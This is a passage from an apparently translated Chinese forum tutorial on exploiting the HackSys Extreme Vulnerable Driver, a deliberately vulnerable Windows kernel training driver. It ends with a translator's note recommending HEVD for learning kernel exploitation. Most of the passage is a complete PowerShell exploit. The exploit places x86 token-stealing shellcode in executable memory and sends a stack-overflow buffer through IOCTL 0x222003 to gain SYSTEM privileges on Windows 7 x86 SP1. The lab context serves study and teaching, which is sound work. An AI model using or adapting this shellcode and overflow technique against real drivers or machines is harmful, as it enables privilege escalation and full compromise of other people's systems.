
```
Add-Type -TypeDefinition @"

using System;

using System.Diagnostics;

using System.Runtime.InteropServices;

using System.Security.Principal;



public static class EVD

{

    [DllImport("kernel32.dll", SetLastError = true)]

    public static extern IntPtr VirtualAlloc(

        IntPtr lpAddress,

        uint dwSize,

        UInt32 flAllocationType,

        UInt32 flProtect);



    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]

    public static extern IntPtr CreateFile(

        String lpFileName,

        UInt32 dwDesiredAccess,

        UInt32 dwShareMode,

        IntPtr lpSecurityAttributes,

        UInt32 dwCreationDisposition,

        UInt32 dwFlagsAndAttributes,

        IntPtr hTemplateFile);



    [DllImport("Kernel32.dll", SetLastError = true)]

    public static extern bool DeviceIoControl(

        IntPtr hDevice,

        int IoControlCode,

        byte[] InBuffer,

        int nInBufferSize,

        byte[] OutBuffer,

        int nOutBufferSize,

        ref int pBytesReturned,

        IntPtr Overlapped);



    [DllImport("kernel32.dll")]

    public static extern uint GetLastError();

}

"@



# Compiled with Keystone-Engine

# Hardcoded offsets for Win7 x86 SP1

$Shellcode = [Byte[]] @(

    #---[Setup]

    0x60,                               # pushad

    0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]

    0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]

    0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)

    0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]

    #---[Copy System PID token]

    0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)

    0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] <-|

    0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |

    0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |

    0x75, 0xED,                         # jnz                           ->|

    0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]

    0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx

    #---[Recover]

    0x61,                               # popad

    0x31, 0xC0,                         # NTSTATUS -> STATUS_SUCCESS :p

    0x5D,                               # pop ebp

    0xC2, 0x08, 0x00                    # ret 8

)



# Write shellcode to memory

echo "`n[>] Allocating ring0 payload.."

[IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Pointer, $Shellcode.Length)

$EIP = [System.BitConverter]::GetBytes($Pointer.ToInt32())

echo "[+] Payload size: $($Shellcode.Length)"

echo "[+] Payload address: $("{0:X8}" -f $Pointer.ToInt32())"



# Get handle to driver

$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, 

[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)



if ($hDevice -eq -1) {

    echo "`n[!] Unable to get driver handle..`n"

    Return

} else {

    echo "`n[>] Driver information.."

    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"

    echo "[+] Handle: $hDevice"

}



# HACKSYS_EVD_STACKOVERFLOW IOCTL = 0x222003

#---

$Buffer = [Byte[]](0x41)*0x800 + [Byte[]](0x42)*32 + $EIP

echo "`n[>] Sending buffer.."

echo "[+] Buffer length: $($Buffer.Length)"

echo "[+] IOCTL: 0x222003`n"

[EVD]::DeviceIoControl($hDevice, 0x222003, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero)|Out-null
```

![](https://bbs.kanxue.com/upload/attach/201801/530966_1pwfcnwlwht4gfs.jpg)

> 译者注：我在本地测试时，WinDbg的输出和作者的不太一样，我是用`!analyze -v`来查看崩溃现场，输出的信息有点冗余，没有原作者的输出信息清爽，所以windbg部分的信息与截图保留了原作者的版本。
>
> HEVD是我个人强烈推荐的入门`Windows内核漏洞`的靶场，实际上内核漏洞并不难掌握，无非就是以下两点：
>
> 1. 调试起来没有用户态那么方便，双机联调+频繁BSOD确实很消磨耐性
> 2. 如果不熟悉WRK，则容易被内核错综复杂的数据结构绕晕，一时云里雾里
>
> HEVD从一个简单的内核驱动程序入手，展示了各种常见的漏洞，让新手可以绕开复杂的Windows内核，掌握内核漏洞的利用。

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于  2018-3-15 20:25

被玉涵编辑，原因：
